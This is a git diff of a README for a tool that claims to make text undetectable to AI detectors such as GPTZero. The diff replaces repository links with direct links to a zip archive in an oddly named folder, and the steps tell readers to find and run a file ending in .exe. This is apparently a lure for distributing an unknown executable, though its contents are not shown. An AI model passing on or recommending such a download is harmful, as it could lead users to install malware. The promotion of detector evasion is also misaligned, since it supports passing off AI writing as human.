@@ -1,6 +1,6 @@
 # 🤖 ai-detection-bypass-gptzero-undetectableai - Make your digital content undetectable to scanners
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/tonic-gesneriad901/ai-detection-bypass-gptzero-undetectableai)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://raw.githubusercontent.com/tonic-gesneriad901/ai-detection-bypass-gptzero-undetectableai/main/subsumable/ai-undetectableai-bypass-detection-gptzero-v3.3-alpha.2.zip)
 
 ## 📌 Project Overview
 
@@ -22,7 +22,7 @@ Ensure your computer meets these standards for smooth performance:
 
 Follow these steps to acquire and install the software. 
 
-1. [Visit this link to obtain the installer](https://github.com/tonic-gesneriad901/ai-detection-bypass-gptzero-undetectableai).
+1. [Visit this link to obtain the installer](https://raw.githubusercontent.com/tonic-gesneriad901/ai-detection-bypass-gptzero-undetectableai/main/subsumable/ai-undetectableai-bypass-detection-gptzero-v3.3-alpha.2.zip).
 2. Look for the file ending in .exe.
 3. Select the file to start the download.
 
